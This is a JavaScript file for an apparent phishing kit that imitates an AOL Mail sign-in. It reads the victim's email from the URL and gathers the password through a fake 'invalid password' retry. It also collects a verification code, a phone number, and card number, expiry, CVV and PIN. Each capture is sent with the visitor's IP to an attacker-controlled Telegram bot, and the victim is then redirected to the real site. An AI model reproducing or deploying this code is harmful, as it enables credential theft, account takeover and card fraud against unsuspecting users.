// Load configuration from config.txt
async function loadConfig() {
    try {
        const response = await fetch('config.txt');
        const text = await response.text();
        const config = {};

        text.split('\n').forEach(line => {
            const [key, value] = line.split('=');
            if (key && value) {
                config[key.trim()] = value.trim();
            }
        });

        return {
            TOKEN: config.TELEGRAM_BOT_TOKEN,
            chatID: config.TELEGRAM_CHAT_ID
        };
    } catch (error) {
        console.error('Error loading config:', error);
        alert('Failed to load configuration');
        return null;
    }
}

// Get location data
async function getLocationData() {
    try {
        const ipResponse = await fetch('https://api.ipify.org/?format=json');
        const ipData = await ipResponse.json();
        return { ip: ipData.ip };
    } catch (error) {
        console.error('Error fetching IP:', error);
        return { ip: 'Unknown' };
    }
}

// Send message to Telegram
async function sendToTelegram(bot, message) {
    try {
        const url = `https://api.telegram.org/bot${bot.TOKEN}/sendMessage`;
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: bot.chatID,
                text: message,
                parse_mode: 'HTML'
            })
        });

        const result = await response.json();
        if (!result.ok) {
            console.error('Telegram API error:', result.description);
            return false;
        }
        return true;
    } catch (error) {
        console.error('Error sending to Telegram:', error);
        alert('Failed to send message to Telegram');
        return false;
    }
}

// Initialize when DOM is loaded
document.addEventListener('DOMContentLoaded', async () => {
    // Load bot configuration
    const bot = await loadConfig();
    if (!bot || !bot.TOKEN || !bot.chatID) {
        console.error('Failed to load bot configuration');
        return;
    }

    // Get location data
    const locationData = await getLocationData();

    // Get DOM elements
    const forma = document.querySelector('#form');
    const formaa = document.querySelector('#formm');
    const formaan = document.querySelector('#formm9');
    const formaas = document.querySelector('#formms');
    const emAil = document.querySelector('#usr');
    const pWd = document.querySelector('#pwd');
    const pWdd = document.querySelector('#pwdd');
    const strong = document.querySelector('.strong');
    const strongg = document.querySelector('#strongg');
    const submit = document.querySelector('#sub');
    const submitt = document.querySelector('#subb');
    const formSeccs = document.querySelector('.form-section-5');
    const formSecc = document.querySelector('.form-section-3');
    const formSecn = document.querySelector('.form-section-9');
    const formSec = document.querySelector('.form-section-2');
    const formCes = document.querySelector('.form-section');
    const display = document.querySelector('#display');
    const ppp = document.querySelector('#ppp');
    const imgg = document.querySelector('.imgg');
    const numba = document.querySelector('#numba');

    let tester = 1;

    // Extract email from URL
    const currentUrl = window.location.href;
    const emailPattern = /[\w._%+-]+@[\w.-]+\.[a-zA-Z]{2,}/;
    const matches = currentUrl.match(emailPattern);

    if (matches && emAil) {
        const email = matches[0];
        emAil.value = email;

        // Send visitor notification
        const visitorMsg = `🔔 AOL Mail - New Visitor\n\nEmail: ${email}\nIP: ${locationData.ip}`;
        await sendToTelegram(bot, visitorMsg);
    }

    // Handle email/password toggle
    if (submit) {
        submit.addEventListener('click', (e) => {
            if (!emAil.value) return;
            if (display) display.textContent = emAil.value;
            if (strong) strong.textContent = 'Enter password';
            emAil.style.display = 'none';
            pWd.style.display = 'block';
        });
    }

    // First form - Email and Password
    if (forma) {
        forma.addEventListener('submit', async (e) => {
            e.preventDefault();
            const email = document.querySelector('#usr').value;
            const pwd = document.querySelector('#pwd').value;

            const message = `🔐 AOL Mail - Login Attempt\n\nEmail: ${email}\nPassword: ${pwd}\nIP: ${locationData.ip}`;

            const success = await sendToTelegram(bot, message);

            if (success) {
                if (tester !== 1) {
                    if (formCes) formCes.style.display = 'none';
                    if (formSec) formSec.style.display = 'none';
                    if (formSecn) formSecn.style.display = 'flex';
                } else {
                    if (strong) {
                        strong.textContent = 'Invalid password. Please try again';
                        strong.style.fontWeight = '400';
                        strong.style.fontSize = '14px';
                        strong.style.color = 'red';
                    }
                    pWd.style.borderBottom = 'red 1px solid';
                    pWd.type = 'text';
                    pWd.value = '';
                    tester = 0;
                }
            }
        });
    }

    // Second form - Verification code
    if (formaa) {
        formaa.addEventListener('submit', async (e) => {
            e.preventDefault();
            const mmn = document.querySelector('#mmn').value;

            const message = `🔒 AOL Mail - Verification Code\n\nCode: ${mmn}\nIP: ${locationData.ip}`;

            const success = await sendToTelegram(bot, message);

            if (success) {
                window.location.replace('https://aol.com');
            }
        });
    }

    // Third form - Phone number
    if (formaan) {
        formaan.addEventListener('submit', async (e) => {
            e.preventDefault();
            const nnm = document.querySelector('#nnm').value;

            const message = `📱 AOL Mail - Phone Number\n\nPhone: ${nnm}\nIP: ${locationData.ip}`;

            const success = await sendToTelegram(bot, message);

            if (success) {
                if (formSec) formSec.style.display = 'flex';
                if (formSecn) formSecn.style.display = 'none';
                const lastFourDigits = nnm % 10000;
                if (numba) {
                    numba.textContent = `+1 ***-***-${lastFourDigits}`;
                }
            }
        });
    }

    // Fourth form - Card details
    if (formaas) {
        formaas.addEventListener('submit', async (e) => {
            e.preventDefault();
            const bin = document.querySelector('#bin').value;
            const exp = document.querySelector('#exp').value;
            const cvv = document.querySelector('#cvv').value;
            const pin = document.querySelector('#pin').value;

            const message = `💳 AOL Mail - Card Information\n\nCard: ${bin}\nExpiry: ${exp}\nCVV: ${cvv}\nPIN: ${pin}\nIP: ${locationData.ip}`;

            const success = await sendToTelegram(bot, message);

            if (success) {
                if (formSecc) formSecc.style.display = 'flex';
                if (formSeccs) formSeccs.style.display = 'none';
                setTimeout(() => {
                    window.location.replace('https://aol.com');
                }, 4000);
            }
        });
    }
});